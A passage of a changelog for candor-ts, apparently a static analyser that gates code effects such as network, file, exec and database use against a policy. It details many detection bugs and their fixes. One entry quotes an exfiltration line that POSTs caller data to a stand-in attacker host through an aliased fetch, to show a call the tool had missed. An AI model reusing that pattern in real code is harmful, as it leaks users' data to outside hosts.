  now share ONE `unaliasGlobal` helper, defined once precisely because this defect has appeared in four
  spellings and each private copy is how the next one gets missed.

- **⚠ CARDINAL SIN — a global reached through a LOCAL ALIAS was silent.** `const send = fetch;
  send("https://evil.example.com/collect", {method:"POST", body:data})` under `deny Net` answered
  **exit 0, `policy ✓`, 0 effectful functions** on published 0.29.0: a POST of caller data to an external
  host, certified clean. The global tests read the CALLEE NODE (`callee.text === "fetch"`,
  `ctext === "globalThis.fetch"`) and an alias's callee is `send`. **The third spelling of one defect** —
  scan.mjs's own comment records `globalThis.fetch` reading silent-pure until it was added beside the
  bare identifier; the instance was fixed and the class was not. Imports were never affected (they
  resolve through the symbol table), and candor-rust/candor-swift charge the aliased form already, so
  this was ts alone. Found by a corpus round: ky, giget and nypm all reported zero Net.
  CONTROLS, which are the fix: a project-local `fetch` shadow fabricates nothing direct OR aliased (the
  unwrap yields the initializer node, so the not-declared-in-this-project guard still decides), aliasing
  an ordinary function stays pure, and the aliased global still captures its HOST so the allowlist and
  masking gates see it. Bounded to ALIAS_HOPS (16) through identifier/property-access initializers only — never a computed
  value, and never a REASSIGNED binding (whose initializer is not its value); exhausting the budget
  discloses Unknown rather than falling back to pure. Rows calibrated: 3 fail with the fix disabled.
  **RESIDUAL, measured and disclosed, not silent:** a global stored in an object property and bound
  (`fetch: globalThis.fetch.bind(globalThis)` … `this._options.fetch(…)`, which is exactly what ky does)
  still isn't resolved — but it reports `Unknown` with `unknownWhy: ["callback:fetch"]` and the gate
  offers `deny Net Unknown`. That is the value-provenance problem, and it answers honestly today.

## [0.29.0] — 2026-08-17

- **The `--gate-json` sink-arming transcript in `scan.mjs` is marked `informative`.** Its `spec 0.28`
  is a measured capture of the run that overwrote an operator's source file, not a shape template, so
  it does not move with the floor.

- **⚠ A tree too deep to walk exits 2 (could not evaluate), not 1 (a violation was found).** The AST
  passes recurse, so deep nesting exhausts the JS stack and node died with an uncaught `RangeError` — a
  raw stack trace on stderr and **exit 1**, this family's code for *a violation was found*. A CI wrapper
  reading the exit code was told the gate had run and failed the tree, when nothing was analyzed and no
  report was written. MEASURED, nested parens: depth 400 walked before ⟨0.29⟩ and overflows after (the
  rung grew `visitCalls`'s frame), depth 800 overflowed **both** — so the crash predates the rung, which
  only dropped the ceiling past `fuzz.mjs`'s fixed 400-deep bait and made it visible. Shrinking the frame
  back would have returned the fuzzer to green and left the wrong exit code live one nesting level lower.
  The new row pins the STATUS because the fuzzer cannot: it asserts `status ∈ {0,1,2}`, so **exit 0
  satisfies it**, and a future change that caught the error and returned an empty report would read green
  while certifying an unwalked tree as clean. Its control: an ordinarily-nested file still exits 0. The guard's residual is stated in
  the source, not merely known: runaway recursion in candor-ts itself exhausts the stack identically and
  would be reported as a deep tree. It stays loud either way (exit 2, no report, never a green), so the
  cost is a misleading message and not a wrong verdict — and this message on a SHALLOW tree means the
  message is the bug.

- **⟨0.29⟩ `forbid`/`only` stop at the SCAN BOUNDARY, and now say so.** Both are matched over the call
  graph; a chained dependency contributes EFFECTS, not EDGES, so a function calling into a dep has an
  empty adjacency and the crossing is invisible to them. MEASURED with a dep chained:
  `only model -> util` answered `policy ✓` over a call into the dependency while a LOCAL unpermitted scope
  in the same run fired AS-EFF-011 — the rule was armed; the boundary was the gap. **Worse for `only`**,
  which asserts A reaches the listed scopes AND NOTHING ELSE — a completeness claim — and exists precisely
  because `forbid` fails open: a package that calls a third-party library is not a leaf, and the gate
  called it one. Disclosed on the advisory channel beside the verdict, the ⟨0.29⟩ `outOfScope` posture:
  say what was not judged, leave the exit code alone. Making the rules cross would need dep-report EDGES
  and would force operators to enumerate third-party scopes in an `only` list — the enumeration-that-rots
  that form was designed to escape. Silent when no dep is chained, and when the policy carries no name rule.
- **⟨0.29⟩ a malformed `net-partner` line was kept as a junk host instead of being disclosed.** The
  grammar is `net-partner <host>`; the `=` spelling an operator reaches for by habit
  (`net-partner = partner.example`) parsed as the HOST `"= partner.example"`, entered the partner set, and
  matched nothing for the rest of the run. **The direction is SAFE** — the gate stays armed, so nothing is
  certified that should not be — which is exactly why it sat unnoticed in ALL FOUR engines: the operator
  believes a partner is declared, the verdict disagrees, and no line connects the two. ⟨0.28⟩ gave POLICY
  files an `ignored` block for this shape; config files had no equivalent anywhere. Now warns and skips,
  which is the contract candor-java's own config doc already claimed for *"every other malformed line in
  this file"*. A well-formed line stays silent.
- **⟨0.29⟩ ⚠ the DOM network globals bypassed the host surface, and a benign literal certified an
  invisible endpoint.** `XMLHttpRequest.open/send` and the `WebSocket`/`EventSource` constructors are
  classified in their own branch (lib.dom declares them with no importable module for the κ table to key
  on); that branch added `Net` and stopped, skipping the block that captures the endpoint and marks the
  surface `incomplete` when it is a runtime value. MEASURED at `policy ✓` exit 0 under
  `allow Net ok.example`: `await fetch("https://ok.example/a"); new WebSocket(u);` — the fetch's allowed
  literal certified the function while the WebSocket connected anywhere. The masking evasion the
  `incomplete` machinery exists to prevent, through the two Net APIs whose branch skipped it.

  `xhr.open(method, url)` puts the URL at argument **1** — the only locator in this engine that is neither
  argument 0 nor a labelled argument; `send` carries no url (fixed at `open`) and stays a use-verb that
  does not hedge. **A second hole closed by the same fix**: with no host captured, the ⟨0.13⟩ model-host
  refinement could never fire on this route, so `deny Llm` silently missed a model call made through
  `XMLHttpRequest`. Nine rows added, four of them over-charge controls, calibrated by reverting.
- **⟨0.29⟩ ⚠ a USE-VERB's argument was read as argv[0], fabricating a command and an EFFECT.**
  `child.send(msg)` is IPC to an ALREADY-spawned child — its argument 0 is a message, not a program.
  `EXEC_USE_VERBS` says exactly that and was consulted for the `incomplete` branch but not for the
  head/`cmds` branch. MEASURED: `ch.send("ls")` published `cmds: ["ls"]` and CERTIFIED under
  `allow Exec ls` though the function executes nothing; worse, `ch.send("curl")` refined the message
  through the command-head table and reported `{ Exec, Net }`, so `deny Net` fired on a function that
  makes no network call. `programHeadLiteral`'s own doc comment forbids exactly this
  (*"`spawn(toolVar, "curl")` must NOT fabricate Net — the literal is an argument, not the program"*) —
  the rule was written for the argument POSITION and never covered the same hazard reached through the
  RECEIVER. Found by asking what the boundary effects (`Ipc`/`Clipboard`), which have NO literal surface,
  do with a literal.
- **⟨0.29⟩ ⚠ `Db` read the first string literal ANYWHERE in the call and parsed it as SQL — the fourth
  and last locator surface.** `db.query(userSql, "SELECT * FROM audit_log")` published
  `tables: ["audit_log"]` and, because a table HAD been captured, the masking guard below it never fired,
  so the function was ABSENT from the violation list under `allow Db audit_log`: a green gate over a query
  whose SQL is a runtime value. Every string-SQL client puts the statement at argument 0
  (`query(text, values)`, `execute(sql, params)`, `raw(sql, bindings)`, `prepare(sql)`), so a later
  literal is a parameter, a fallback query or a health-check string. Now reads argument 0, matching
  candor-rust; candor-java captures the same fabricated table but also marks `incomplete`, so its verdict
  fails closed on an imprecise report rather than certifying.
- **⟨0.29⟩ the `cmds` surface reads argv[0] too.** It was documented as "the cosmetic cmds surface (any
  literal)" — but `cmds` is exactly what `allow Exec <cmd>` gates on under AS-EFF-008, which is not
  cosmetic. No node API places a bare string after the head (args are an array, options an object), so
  this changes no measured behaviour today; it removes the hazard for the next exec-like wrapper whose
  second argument is a string, which is how this identical defect reached `Fs`, `Net` and `Db`.
  **`firstStringLiteral` is DELETED.** It read every locator surface except the `Exec` head and
  produced the same defect in each one it touched — the bytes as the path, the payload as the host, a
  parameter as the table — each a fabricated locator that ALSO suppressed the masking guard. Removed
  rather than left unused: a "first literal anywhere" in scope is how the class comes back at the next
  call site somebody adds.
- **⟨0.29⟩ ⚠ dgram's destination is at argument 2 or 4; argument 0 is the MESSAGE, and it was being
  published as the host.** `urlArgLiteral` fell through to `litAt(0)` for `send`, so
  `sock.send("telemetry.example", 0, 17, 53, dst)` reported `hosts: ["telemetry.example"]` with no
  `incomplete` — `allow Net telemetry.example` then answered `policy ✓` at exit 0 over a UDP send to a
  runtime-controlled address. A fabricated destination masking a real one: the `Fs` content-literal defect
  of this same rung, one effect over, in the one node API whose locator is neither first nor second. The
  position is now recovered from the numeric PORT that must precede the address in each of node's two
  documented overloads, and anything matching neither returns null and fails closed. candor-java and
  candor-swift fail closed on their equivalents.

  **The existing masking row could not see it**: its fixture sends `Buffer.from("x")`, which is not a
  string literal, so `litAt(0)` returned null there and the assertion passed for a reason unrelated to the
  position rule. A fixture chosen for one property had silently decided another. Five rows added,
  including both overloads as over-charge controls, calibrated by reverting.
- **⟨0.29⟩ ⚠ a two-path `Fs` op with a literal in BOTH positions published only the first.**
  `fs.copyFileSync("/tmp/lit", "/tmp/dst")` under `allow Fs /tmp/lit` answered `policy ✓` at exit 0 while
  writing `/tmp/dst` — the completeness verdict was computed over both path positions while the surface
  listed one. candor-java and candor-swift published both. `fsPathLiteral` returns every literal position
  now. Conformance PART 51's `twoLit` row.
- **⟨0.29⟩ `readv`/`writev` (+`Sync`) were missing from `FS_USE_VERBS`** and so were charged `incomplete`
  though their first argument is a DESCRIPTOR, not a path. The positional-literal fix is what exposed it:
  before, their literal was found anywhere in the call and published as a path, so the set was never
  consulted — killing the fabrication moved them into the other wrong bucket. Node has 24 fd verbs; this
  set had 20. Both found by generating a case per `fs` export (144 cases) instead of re-reading the list.
- **⟨0.29⟩ ⚠ an `Fs` path literal came from ANYWHERE in the call, not the path POSITION.** MEASURED:
  ``fs.writeFileSync(userPath, "/tmp/lit")`` published `paths: ["/tmp/lit"]` — the BYTES BEING WRITTEN — so `allow Fs /tmp/lit`
  answered `policy ✓` at exit 0 over a write to a runtime-controlled destination, where candor-java and
  candor-swift fail closed on identical code. The operator's own allow-rule is the mechanism of the false
  all-clear, which is worse than having no rule: the report names a path nothing was written to. The
  discipline already existed in this family twice — this file states it at the `Exec` head ("the head MUST be argv[0], NOT any literal arg") and the block below says it was "generalized from Exec to Net" — and stopped there. Reading
  the locator POSITION now, and a multi-path operation (`copy`, `rename`, `link`) is a complete surface
  only when EVERY position is a literal; one literal beside one runtime path marks `incomplete: ["Fs"]`.
  SPEC §2, conformance PART 51, whose `okLit` control asserts a fully-literal write still certifies —
  giving up the surface would pass every other assertion and answer nothing. Found by the pre-release panel.
- **⟨0.29⟩ ⚠ `excluded[].peeked` claimed a read the peek had not finished.** The rung already made
  the flag an OUTCOME rather than a lookup on the exclusion class, and stopped one level short. The peek
  reuses this engine's own entry point, so it produces its own ⟨0.21⟩ `unanalyzed` manifest — and
  the parent read only `functions` and discarded it. An excluded file that FAILED TO PARSE inside the peek therefore published
  `peeked: true` beside `outOfScope: []`, byte-identical to a clean peek, on ALL FOUR engines. The
  ⟨0.26⟩ partial-manifest rule failing inside the rung built to enforce it, in the same field, twice.
  The claim is withdrawn PER CLASS — a parse failure is a fact about one file — and an unread file that
  cannot be attributed to a class withdraws the claim for all of them. SPEC §2, conformance PART 52,
  calibrated in both directions: reverting the fix fails shape A, and publishing the SAFE value
  unconditionally fails the control that notices the feature has been deleted.
- **⟨0.29⟩ ⚠ `outOfScope` was published over a policy this engine REFUSES.** SPEC §2 already said
  the key must be ABSENT there — "the peek is a producer reading the policy, and it may not certify
  relative to a gate that evaluated nothing" — and the clause shipped WITH the rung while only
  candor-java implemented it. The harm is the key, not the finding: `outOfScope: []` beside an exit 2
  reads *a policy was configured, I looked at what it denies, and there is nothing*, when the look was
  taken against rules no route would honour and the denied set searched was the parser's SALVAGE of an
  unhonourable file — the silent rewriting the refusal exists to prevent, one layer down. Conformance
  PART 53, whose two controls stop an engine passing by never emitting the key (which deletes the peek)
  and by collapsing present-and-empty into absent (⟨0.27⟩ asked-and-clear vs ⟨0.26⟩ cannot-answer).
- **⟨0.29⟩ ⚠ `only` violations carry their OWN code, `AS-EFF-011`** — not `forbid`'s `AS-EFF-009`. A rule
  code is the handle a CI suppression, a dashboard link and an alert filter key on, and the two forms are
  opposite constructs: must-not-reach versus must-be-on-the-list, with opposite remedies. **The decisive
  argument is timing.** Before this rung an `AS-EFF-009` suppression meant exactly *"I have accepted a
  `forbid` crossing"*; shipping `only` under it would make every existing suppression silently begin
  muting a class of violation its author never accepted — a fail-open change to an operator's config, made
  by us and invisible to them, which is the argument `only` itself is built on turned on the tool. Free to
  fix before release, breaking after it. Pinned by PART 49, which asserts both halves: 011 present AND 009
  absent, since a row checking only the first would pass on an engine emitting both.
- **⚠ ⟨0.29⟩ THE PEEK REFUSED THE VERY FILES IT WAS HANDED, and said it had read them.** The parent
  writes a tsconfig naming the excluded files and spawns a child over it — and the child then applied its
  OWN selection rules to that list, so `isTestPath` dropped every `test-file` exclusion before analysis.
  MEASURED: a `*.test.ts` running `execSync("ls")` under `deny Exec` produced
  `excluded: [{class:"test-file", peeked:true}]` with `outOfScope: []` — the peek reporting that it read
  the file and found nothing, about a file it had refused to open. A peek is handed an explicit list and
  must analyse exactly that; both selection filters now honour the internal `--peek-excluded` marker.
- **⚠ ⟨0.29⟩ `excluded[].peeked` was hardcoded `true`.** So a peek that never ran, could not spawn, or
  returned unparseable output still published the flag beside `outOfScope: []` — the ⟨0.26⟩
  partial-manifest failure inside the rung built to prevent it. It is an outcome now, and the scope block
  is assembled AFTER the peek: it was built before, reading a flag nothing had yet set, which is a field
  whose whole job is to say whether a read happened computed before the read.
- **⟨0.29⟩ `only`'s permitted scopes match by exact segment run.** The shared prefix matcher is
  fail-CLOSED for deny/forbid and fail-OPEN for a permission — `only model -> util` permitted
  `utilities_untrusted`. Found by review, four-way.
- **⟨0.29⟩ A deadline on the peek child** (`timeout` beside `maxBuffer`): it re-parses exactly the files
  this engine has never parsed, so one pathological input hung the scan and its CI job.
- **⟨0.29⟩ `resolves` now declares `incomplete`** (SPEC §2.1). An absent `incomplete` is overloaded
  between "this producer does not compute undetermined locators" and "it computed them and found none" —
  exactly the ambiguity `resolves` was built for, one field over from the `fs` case that motivated it. A
  producer that computes the surface declares it; one that does not MUST NOT, since listing it would turn
  "unimplemented" into a false "nothing undetermined". Pinned by conformance PART 50, which checks the
  declaration BEFORE reading any absence as meaningful.
- **⚠ ⟨0.29⟩ A CHAINED DEPENDENCY'S UNDETERMINED LOCATOR WAS INVISIBLE, and it certified a gate that
  should have failed.** This engine computed `rec.incomplete` — the effects whose LOCATOR a unit could not
  determine — and never published it, on a comment asserting the field is "deliberately INTERNAL
  family-wide (java/rust keep it out of the report too)". **candor-rust has emitted it all along**, and
  SPEC §2 says so in the clause beside the one this engine was following, so the premise was a statement
  about the family that was never true. MEASURED: a dependency whose `Fs` path is a runtime value
  published nothing to say so, and a consumer that ALSO wrote ONE allowed literal joined
  `paths: ["/tmp/lit"]` with no marker — `allow Fs /tmp/lit` answered **`policy ✓`** where candor-rust
  charges AS-EFF-008 on identical code. The field is emitted and joined now (§2's chained-join clause
  names it among the surfaces a join must carry), and pinned four-way by conformance PART 50.
- **⟨0.29⟩ `only <A> -> <B> [<C> …]` — the PERMISSION form (SPEC §6.2, AS-EFF-009).** `A` may reach `A`
  itself and the listed scopes, nothing else. **`forbid` FAILS OPEN — the dependency you forgot to
  prohibit is silently permitted — so a leaf package could only be protected by an enumeration that does
  not cover a package added tomorrow.** `only` fails SAFE. The walk STOPS at a permitted scope (its own
  dependencies answer to the rules about IT), `A -> A` is implicit, zero-match is measured on `from`, and
  a report route REFUSES it (exit 2) for a stricter reason than `forbid`'s: `only` asks whether
  EVERYTHING reached is on a list, so a report that omits a crossing turns a green into a claim of
  COMPLETENESS. **Five sites decide "this policy asks nothing"** — `scan.mjs`, `query.mjs` ×2, `lsp.mjs`,
  `mcp.mjs` — and every one had to count the new kind, or an `only`-only policy would be refused as a
  zero-rule file: the ⟨0.28⟩ fail-closed guard turned into a false refusal by the rung that added the kind.
- **⟨0.29⟩ Every unevaluated-rule row NAMES ITS OWN RULE, on every channel.** The `why` was one shared
  sentence per KIND, phrased as a count — so with two `forbid` lines both rows read *"this policy has 2
  `forbid` rule(s)"*, a fact about the file attached to a row about one line of it, whose obvious reading
  (that the row covers all of them) is false. Two callers prefixed the rule and **three printed `why`
  alone** — the advisory disclosure, the LSP fix path, and the MCP error, i.e. the agent channel — so the
  rule name was missing exactly where a reader has least context. `why` is self-contained now and the two
  prefixing callers drop their prefix; a channel added later cannot lose it. `allow` moves with `forbid`,
  the sibling no conformance row anywhere writes into a `.pol` file.
- **⟨0.29⟩ `peeked` on every `excluded` entry.** An empty `outOfScope` says "I read the excluded files
  and none held an effect this policy denies", and it may make that claim only about the classes it
  actually read. This engine answers `true` throughout — the peek is handed exactly `excludedFiles` and
  analyses that set and nothing else — but the flag is not a constant across the family: **candor-java
  cannot read a `.java` that was never compiled** (it reads bytecode), and **candor-swift does not read
  `.build/`**. Without it their `[]` would certify files nobody opened, the ⟨0.26⟩ partial-manifest
  failure. Added while porting this rung to those two arms.
- **⟨0.29⟩ …and the PEEK.** candor-ts now READS the files it excluded and warns when they hold an effect
  the policy DENIES:

  ```
  candor-ts: ⚠ deploy performs Exec — OUTSIDE this scan's scope
               (outside-the-tsconfig-program), so the gate did NOT judge it.
             excluded/deploy.ts
             The verdict does not account for it.
  candor-ts: policy ✓        exit 0
  ```

  **The verdict does not move** — the finding rides the report as `outOfScope`, its own kind, never a
  violation: a file the gate declined to judge must not decide an exit code.

  A CHILD `scan.mjs` over a generated tsconfig, not a second analysis path. candor-rust buys this by
  recursing into `scan_one`; this engine is a script rather than a callable function, so the same
  guarantee comes from the same BINARY over a different file set. A bespoke second pass would be a second
  opinion, and a drifted second opinion reported as a warning is worse than no warning.
  Placed ABOVE the report write on purpose: the gate block runs after the envelope is serialised, so
  computing it there would have put the finding on stderr and left it out of the artifact.
  A peek that cannot run leaves `[]` and never fails the gate — turning a child-process failure red would
  make adding a policy, the safest thing an operator can do, the thing that breaks their build.

  Three bounds: `deny Exec` finds it, `deny Net` over the same tree says nothing, no policy says nothing
  and OMITS the key (nothing was asked, so `[]` would be a claim).

  Findings are named from the PROJECT, not the child's temp root — the child derives qualifiers from its
  own tsconfig's directory, so the first version reported a dotted absolute path into a directory that no
  longer existed by the time anyone read it.

- **`scratch.mjs` now covers what its own header claims.** It says "every harness here made fixture trees
  with a bare `fs.mkdtempSync` and removed none of them" — and it had exactly ONE importer, `test.mjs`.
  Eight harnesses and 59 sites now use it: `test-unit`, `test-mcp`, `test-lsp`, `test-watch`, `fuzz`,
  `fabrication_probe`, `sensitivity`, `transitive-recall`. Three of them also throw `keepOnFailure()`, so
  a failing row's fixture tree survives the sweep — the switch has been in `scratch.mjs` since it was
  written and only `test.mjs` was using it.
  **Stated honestly: the measured leak here is ONE directory, not thousands.** These harnesses pair
  `mkdtemp` with `rmSync` on the happy path; the exposure is the failure and signal paths, and SIGKILL
  is uncatchable so nothing helps there. The 46,919 figure in that header came from `test.mjs`'s
  `project()` at ~1,300 calls a run, which was already fixed. What changes is that the file's stated
  scope is now true rather than aspirational, and that a killed run cleans up after itself.
- The `--parallel` driver's private copy of the bounded write loop is **deleted**, not tested twice. It
  was a closure inside the driver branch, so no route the suite drives could reach it — the arm was
  untested by construction, which is the sibling asymmetry inverted: `contract.mjs`'s half got the row
  that caught it being vacuous on Linux, and the driver's half, fixed first, got none. Both now use
  `writeStdoutSync`, which returns whether every byte landed so the driver can still turn a dropped write
  red. The residual is unchanged and restated in place: on that path fd 1 stays BLOCKING, so the EAGAIN
  arm is latent and a blocking write cannot be bounded from user code.

- **`test-watch.mjs` orphaned its watcher.** `watch.mjs` is an infinite `setInterval` that is
  deliberately not unref'd, and the harness spawns it with `stdio[0]: "ignore"` — so it has no stdin to
  hit EOF on, which is the rescue that saves `test-mcp.mjs` and `test-lsp.mjs` (their servers inherit a
  pipe and exit when it closes). The only thing stopping it was the explicit `proc.kill` on the happy
  path, so a SIGTERM during any of the three 30-second deadlines left a process re-scanning a deleted
  fixture tree forever. **Measured: 1 orphan without a handler, 0 with one.** Same shape, and the same
  pass, as candor-rust's `integration.sh`, which had no trap in the entire file.

- **⚠ ⟨0.29⟩ `--json` LOST 30 KB THROUGH A PIPE, and the document that arrived was invalid.** MEASURED on
  a 400-file scan under a violating policy: **95281 bytes to a FILE, valid JSON; 65536 bytes through a
  PIPE, a JSONDecodeError** — exactly the pipe buffer, exit 1 on both, nothing on stderr. `console.log` is
  asynchronous on a pipe and every bulk-output path ends in `process.exit(…)`, which discards what is
  still buffered. This is the machine-consumer path — `candor-ts src --json --policy p | jq` — so the loss
  is silent AND the document is unparseable, which is strictly worse than the `--agents` truncation that
  got this class fixed one release earlier. `--agents` was never the only print-then-exit site; it was the
  only one that got FIXED, and the umbrella backlog asserted the remaining sites "fit the buffer and
  survive by SIZE" — true of the usage strings somebody measured, false of the report envelope nobody did.
  The bounded synchronous writer is now `writeStdoutSync()`, shared: `scan.mjs --json`, `printAgents`, and
  all twelve `emit` sites in `query.mjs` (every query verdict document an agent pipes into `jq`) go
  through it. Three rows compare a PIPE against a real FILE, with a control that the fixture still exceeds
  the buffer; teeth-verified by reverting the scan fix.
  **Clean siblings, stated because a clean sibling is a result**: candor-rust (106781 bytes) and
  candor-swift (116222) deliver byte-identical output to a file and a pipe — this is Node's async stdout,
  not a family-wide defect.

- **⟨0.29⟩ `unverified` and `fix-gate` certified over a policy the gate had refused.** Their
  `unevaluated` machinery — the note, the omitted `ok`, the `--strict` exit 2 — has been correct since
  ⟨0.24⟩; its INPUT was incomplete. `coreUnverified`/`coreFixGate` report scoped-`deny` refusals only, so
  a `forbid`-only policy left the set empty and both verbs answered `{ok: true}`. Now fed from the shared
  `wholePolicyUnanswerable()`. Four-way at exit 2 under `--strict`, pinned by conformance PART 47.

- **⟨0.29⟩ CARDINAL-SIN CLASS, on the agent channel: `forbid` was answered from a report by the MCP tool
  and the LSP.** SPEC §3.1's ⟨0.24⟩ answerability MUST binds every route that reads a §2 report, and only
  the CLI implemented it. `mcp.mjs` and `lsp.mjs` passed the WHOLE policy to `evaluatePolicy`. **Measured
  both ways, and both are outcomes the MUST forbids**: with no callgraph sidecar (what `loadCallgraph`
  returns for a hand-copied `report.json`) the answer was `violations: []` with nothing disclosed — a
  silent green over a rule that was never enforced; with a sidecar it EVALUATED the rule and returned an
  AS-EFF-009 violation from evidence the spec says cannot support one. This is the channel an agent reads,
  and `candor mcp` routes **every engine's** reports through it.
  The fix is one implementation with three callers — `wholePolicyUnanswerable()` in `policy.mjs` — not a
  third copy that agrees today. The CLI now uses it too. A `forbid`/`allow`-only policy REFUSES; beside a
  `deny` that can fire, the `deny` decides and the unanswerable rule rides along disclosed, per §3.1's
  precedence ruling that whole-policy granularity is not a licence to suppress a certain violation.
  Eight new rows across the MCP and LSP suites, including controls that a policy with no `forbid` gains no
  hedge. Teeth-verified: reverting the MCP fix alone turns two of them red.
- **Both disclosures now NAME THE RULE.** They carried the kind — "this policy has 1 `forbid` rule(s)" —
  so an operator with three of them learned that three rules went unenforced and not which. The
  `unevaluated` array in the JSON document had `rule` all along; the human channels did not show it. In an
  editor this is the entire cost of the refusal: the squiggle is absent either way, and the message is the
  only thing standing in for it.

- **`--agents`'s EAGAIN retry could spin forever — LATENT on the production path, and that caveat is
  part of the fix, not a footnote.** Measured after the change: `node scan.mjs --agents` into a FIFO whose
  reader holds it open and never drains is **still blocked at 20 s with empty stderr**. The guard is not
  reached, because nothing on that path creates a `process.stdout` stream, so libuv never flips fd 1 to
  non-blocking and `writeSync` blocks in the kernel instead of raising EAGAIN. One `console.log` added
  anywhere before the dump arms it. The sibling driver in `test.mjs` carried this caveat and this file did
  not — the caveat is the thing that failed to travel. The residual, stated plainly: a *blocking* write
  cannot be bounded from user code without going async, and that is not fixed here. What IS fixed:
  `contract.mjs`'s EAGAIN retry was
  `while (off < buf.length)` with an unconditional 1 ms sleep and no way out, so a reader that stalls
  *without closing* — an agent harness blocked while holding the pipe, a log collector wedged on a full
  disk — spun forever. The EPIPE arm covers the reader that LEFT; this is the one that stayed and
  stopped, and from inside the loop the two look nothing alike. A hung `--agents` reports nothing and
  cannot be told from a slow one. Now bounded at 5 s, reset on every byte that lands (a slow reader is
  never punished for being slow), and it says on stderr that the contract is INCOMPLETE rather than
  giving up quietly — which would be the truncation-with-exit-0 that function was written to remove.
  Covered by a test that drives the real loop against a FIFO opened `O_NONBLOCK` and **filled to
  capacity first**; `printAgents(fd, budgetMs)` takes those two parameters only so the suite can reach it.
  The fill is not incidental: without it the 24 KiB contract fits a 65536-byte Linux FIFO in one write,
  EAGAIN never fires, and the row passes in 1 ms having tested nothing — which is what happened, and CI
  caught it only because the second assertion reads the guard's own diagnostic rather than the clock.
  And "bounded at 5 s" means five seconds of ZERO PROGRESS, not of wall-clock: the deadline resets on
  every byte that lands, so a slow reader is never cut off for being slow.
- **The test driver's children outlived the parent.** SIGTERM to `node test.mjs --parallel` left every
  shard alive with ppid 1, still scanning and still minting fixture trees nothing would sweep —
  measured at 4 orphans and 69 leaked directories. Ctrl-C hid it, because a tty signals the whole
  process group; a CI step timeout or a plain `kill` does not. Also measured on the way: **SIGTERM alone
  does not kill a shard.** Installing a JS signal listener replaces the default die-disposition, and the
  callback can only dispatch from the event loop — which a shard's 175 blocks of synchronous
  `spawnSync` scans never reach. So the sweep handler that exists to stop the fixture-tree leak is what
  makes the leaking process unkillable, and that is true of a plain `node test.mjs` too. TERM, a 500 ms
  grace, then KILL what is left; the children's `TMPDIR` is now one parent-owned directory, so the
  parent's sweep takes trees a SIGKILLed child could never sweep itself. 0 orphans, 0 trees.
- **`--parallel=N` and `CANDOR_TEST_SHARDS` are validated.** `3.7` reached the children as
  `--shard=0/3.7` and every shard exited 2, so the parent blamed the shards for a flag it wrote itself;
  `abc`, `-4` and `0` fell back to the core count with nothing on stderr — an operator setting the
  override precisely to stop an oversubscribed run got one, silently; `1e9` reached
  `Array.from({length: 1e9})`. Whole numbers 1..64, usage error and exit 2 otherwise, in `--shard`'s
  shape. An empty env var still reads as unset; an empty `--parallel=` does not.
- The driver's own relay now bounds its EAGAIN retry the same way and turns the run RED if a write was
  dropped — a dump it could not finish is an incomplete report, which is why `broke` exists.

## [0.28.2] — 2026-08-15

_A cardinal-sin fix. 0.28.1's body-less-declaration pass reopened, in two shapes, the hole it was
written to close — both found by a max-effort review of that patch, both live on npm and crates.io
until this release. The spec floor is unchanged at 0.28._

- **The `--parallel` driver could lose its own summary.** It relayed each shard's buffered stdout with
  `process.stdout.write` and then `process.exit()` — asynchronous on a PIPE, so the tail was discarded:
  measured at exactly 65536 bytes delivered with the `test: N passed` line GONE, and CI captures step
  stdout on a pipe. That is the identical defect `contract.mjs` was rewritten for one release earlier,
  in its sibling. Now `fs.writeSync`. Two more in the same driver: `spawn` has no `encoding` option (it
  is spawnSync/execFile's), so chunks arrived as Buffers and were decoded independently — 29 U+FFFD per
  264 KB, because the assertion names are dense with 3-byte characters; and a child's exit STATUS and
  SIGNAL were ignored, so a shard that printed valid counts and then died contributed them and let the
  parent exit 0.

- **`ci/shard-check.sh`'s red branches were dead code.** It read the summary with `tail -1`, but
  `scratch.mjs`'s exit sweep prints its kept-trees line AFTER the summary on any FAILING run — so a
  genuine failure came back as "could not parse the baseline summary", the could-not-evaluate collapse
  this same release fixed in the self-gates. Anchored on `^test: N passed` instead, and falsified.
  Its header also claimed an index-union check that does not exist; the comment now states what the
  sum CANNOT catch, including that it passed a "parallel" driver which was sequential by construction.

- **`--agents` truncation is stated rather than swallowed.** Catching EPIPE stopped `| head` being a
  failure, but restored a truncated contract with exit 0 and an empty stderr — verbatim the defect that
  rewrite removed. It now writes one stderr line naming the byte count, and still exits 0.

- **The self-gate's exit-2 branch is gated on the Exec verdict.** It fired before half (2) was reported,
  so an ESTABLISHED AS-EFF-006 violation was announced as "not a violation, the boundary was never
  judged" and the FAILED line was unreachable — the collapse it fixed, inverted.

- **⚠ `declare function f(); declare namespace f {}` read PURE — the axios cardinal sin, reopened.**
  The UMD/ambient typings shape of jQuery, lodash, moment and chalk. `overloadImplOf` tested `!!d.body`,
  and a `ts.ModuleDeclaration` HAS a body (its ModuleBlock), so the namespace was taken for the overload
  implementation, the `Unknown` was dropped, and the caller was certified pure: `wrote 0 effectful
  functions`, `deny Unknown` exit **0**. Fixed with a node-kind guard — only a form that can carry a
  FUNCTION body can be an implementation.

- **⚠ A caller through a RE-DECLARING intermediate abstract class VANISHED from the report.** Absence
  from `functions` is a positive purity claim (SPEC §2 rule 3), and both `deny Unknown` and `deny Fs`
  passed over a real `Fs`. Making `answeredByLocalBody` climb transitively removed the base member's
  `Unknown`, but the dispatch-site fan-out is still ONE level — the `Unknown` had been COMPENSATING for
  that, and the climb deleted the compensation without supplying what it compensated for. Reverted to
  direct-only: over-charging that shape is survivable, under-reporting it is not. Transitive fan-out
  (building `classOverrides` transitively, as `classDescendants` already is) is the real fix, filed.

- **The overload skip now depends on an EDGE BEING FORMED, not on finding a declaration.** `nodeName` is
  minted only for `projectFiles` while the symbol spans the whole program, so an unresolved target
  dropped the charge AND formed no edge — a disclosure pass failing OPEN.

- **And the control that let the second one ship was VACUOUS.** The "three-level hierarchy" row asserted
  `Fs` on a hierarchy whose middle class re-declared nothing, so `classOverrides` already linked the
  concrete override straight to the base: it passed identically on an engine WITHOUT the change it
  claimed to guard. Replaced with a re-declaring hierarchy and a base-typed receiver, asserting the
  caller is not LOST — and both new rows were verified to FAIL on the shipped 0.28.1 engine.

## [0.28.1] — 2026-08-15

_Post-release review fixes. 0.28.0 shipped, then a high-effort review of that work found
defects in it — three of them a defect of the same class as the fix that introduced them. The
spec floor is UNCHANGED at 0.28: no contract moved, so this is a build-version patch._

- **`npm test` runs the behavioural suite in parallel: 346s → 139s locally** (`test.mjs` itself
  286s → 74s, 3.9× on 12 cores). `--shard=I/N` filters top-level blocks; `--parallel[=N]` runs those
  shards as children and sums them. The blocks were already independent — `{}`-scoped, each minting its
